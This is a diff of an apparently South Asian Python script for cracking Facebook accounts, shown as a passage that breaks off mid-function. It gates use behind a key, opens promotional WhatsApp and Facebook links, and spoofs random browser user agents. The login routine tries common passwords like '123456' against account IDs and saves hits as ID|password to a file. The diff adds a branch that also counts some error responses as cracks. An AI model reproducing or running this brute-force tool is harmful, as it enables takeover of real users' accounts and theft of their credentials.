@@ -14,10 +14,13 @@ from random import randint as rr
 from concurrent.futures import ThreadPoolExecutor as tred
 from os import system
 from datetime import datetime
+
 import os, sys
+
 # Tumhara Facebook group link
 # Valid keys (inbox par available hogi)
-approved_keys = ["NEHAL-ADRIAN it's your father bro"]
+approved_keys = ["NEHAL-ADRIAN hfjgbvcdhbvvd@@-2025"]
+
 def first_step():
     os.system("clear")
     print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
@@ -26,9 +29,12 @@ def first_step():
     print("\033[1;32m JOIN MY FACEBOOK GROUP ✅ \033[0m\n")
     print("\033[1;32m YOU NEED KEY INBOX ME ✅ \033[0m\n")
     print("[!] FAST JOIN FACEBOOK GROUP .")
+  
     # Yeh direct WhatsApp channel open karega
     os.system(f"xdg-open {channel_link}")
+
     input("\n[↩] JOIN FAST THEN USE TOOLS ...")
+
 def check_key():
     user_key = input("\n[?] Enter your key: ")
     if user_key in approved_keys:
@@ -41,6 +47,8 @@ check_key()
 
 # Tool ka main code yahan likho
 print(">>> Tool Successfully Unlocked <<<")
+
+
 
 # Ensure required modules are installed
 modules = ['requests', 'urllib3', 'mechanize', 'rich']
@@ -55,16 +63,19 @@ from requests.exceptions import ConnectionError
 from requests import api, models, sessions
 requests.urllib3.disable_warnings()
 
+
 # Initial setup and promotion
 os.system('clear')
 print(' \x1b[38;5;46mNEHAL SERVER LOADING....')
+
 
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 os.system('pip install httpx pip install beautifulsoup4')
 print('loading Modules ...\n')
 os.system('clear')
 os.system('xdg-open https://chat.whatsapp.com/LSThCyhzhVa58fgXanrcMx?mode=ems_copy_t')
-os.system('xdg-open https://www.facebook.com/profile.php?id=100078316453121')
+os.system('xdg-open https://www.facebook.com/BaLoch0654')
+
 
 # --- Anti-tampering and Security Checks ---
 # The script checks if the source code of the 'requests' library has been modified
@@ -79,6 +90,7 @@ try:
             exit()
 except:
     pass
+
 
 class sec:
     """
@@ -131,6 +143,7 @@ RR = '\x1b[38;5;196m'
 GS = '\x1b[38;5;40m'
 W = '\x1b[1;37m'
 
+
 def windows():
     """
     Generates a random Windows User-Agent string.
@@ -147,6 +160,7 @@ def windows():
     C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
     D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
     return random.choice([A, B, C, D])
+
 
 def window1():
     """
@@ -167,6 +181,7 @@ def window1():
     D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
     return random.choice([A, B, C, D])
 
+
 # Set window title
 sys.stdout.write('\x1b]2;𓆩【NEHAL】𓆪 \x07')
 
@@ -184,9 +199,12 @@ def ____banner____():
 ████╗  ██║██╔════╝██║  ██║██╔══██╗██║     
 ██╔██╗ ██║█████╗  ███████║███████║██║     
 ██║╚██╗██║██╔══╝  ██╔══██║██╔══██║██║     
-██║ ╚████║███████╗██║  ██║██║  ██║███████╗                 It's Your Father Bro 🥵💥
+██║ ╚████║███████╗██║  ██║██║  ██║███████╗
 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
+
+
 \033[0m""")
+
 
 def creationyear(uid):
     """
@@ -314,7 +332,6 @@ def old_One():
     meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOOLS OWNER NEHAL {Y}: {G} {limit}{W}")
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
@@ -413,7 +430,7 @@ def login_1(uid):
     try:
         sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mNEHAL-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
-        for pw in ('123456', '1234567', '12345678', '123456789', '111111', '000000', '121212', '123123',):
+        for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -460,3 +477,11 @@ def login_1(uid):
                 open('/sdcard/NEHAL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
+            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mNEHAL\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/NEHAL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+        loop += 1
+    except Exception:
+ 
